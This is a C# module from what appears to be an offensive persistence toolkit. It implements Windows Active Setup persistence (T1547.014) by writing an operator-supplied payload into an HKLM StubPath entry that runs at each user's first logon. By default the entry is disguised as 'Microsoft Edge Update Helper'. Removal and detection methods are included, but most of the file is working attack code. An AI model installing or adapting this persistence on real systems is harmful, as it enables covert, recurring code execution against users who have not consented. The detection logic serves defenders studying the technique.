using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Active Setup Persistence (T1547.014)
    ///
    /// Active Setup compares HKLM vs HKCU version keys per component GUID. If the
    /// HKLM version is higher (or HKCU entry missing), the StubPath command runs
    /// as the logged-on user. Fires once per user account - including every new
    /// domain user logging in for the first time.
    ///
    /// Registry: HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{GUID}
    ///   StubPath = command, Version = 1,0,0,0, ComponentID = display name
    ///
    /// Requires admin (HKLM write). Executes as logged-on user, not SYSTEM.
    /// Useful in enterprise environments where new users log in frequently.
    /// </summary>
    public class ActiveSetup : ITendril
    {
        public string Name { get { return "ActiveSetup"; } }
        public string Description { get { return "Active Setup StubPath - fires once per user logon, targets new logins"; } }
        public string MitreId { get { return "T1547.014"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string ActiveSetupPath = @"SOFTWARE\Microsoft\Active Setup\Installed Components";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, guid, componentId;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<command>");
            if (!options.TryGetValue("guid", out guid))
                guid = "{" + Guid.NewGuid().ToString().ToUpper() + "}";
            if (!options.TryGetValue("name", out componentId))
                componentId = "Microsoft Edge Update Helper";

            string keyPath = ActiveSetupPath + @"\" + guid;
            RegistryUtils.SetRegValue("HKLM", keyPath, "StubPath", payload);
            RegistryUtils.SetRegValue("HKLM", keyPath, "Version", "1,0,0,0");
            RegistryUtils.SetRegValue("HKLM", keyPath, "ComponentID", componentId);

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Active Setup installed: {0}", guid))
                .WithMeta("GUID", guid)
                .WithMeta("StubPath", payload)
                .WithMeta("ComponentID", componentId)
                .WithMeta("Note", "Fires once per user at next logon.");
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string guid;
            if (!options.TryGetValue("guid", out guid))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing /guid:{GUID} from install output");

            RegistryUtils.DeleteRegKeyTree("HKLM", ActiveSetupPath + @"\" + guid);
            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Active Setup removed: {0}", guid));
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            // Known Microsoft GUIDs start with specific prefixes; flag anything unusual
            string[] components = RegistryUtils.GetRegSubkeys("HKLM", ActiveSetupPath);
            foreach (string comp in components)
            {
                string stubPath = RegistryUtils.GetRegValue("HKLM", ActiveSetupPath + @"\" + comp, "StubPath");
                if (string.IsNullOrEmpty(stubPath)) continue;

                // Flag non-Microsoft stubs
                bool suspicious = !stubPath.ToLower().Contains(@"\windows\") &&
                                  !stubPath.ToLower().Contains(@"\microsoft") &&
                                  !stubPath.ToLower().Contains("regsvr32");

                if (suspicious)
                {
                    string cid = RegistryUtils.GetRegValue("HKLM", ActiveSetupPath + @"\" + comp, "ComponentID");
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("Non-standard Active Setup: {0}", comp))
                        .WithMeta("GUID", comp)
                        .WithMeta("StubPath", stubPath)
                        .WithMeta("ComponentID", cid ?? ""));
                }
            }
            return results;
        }
    }
}
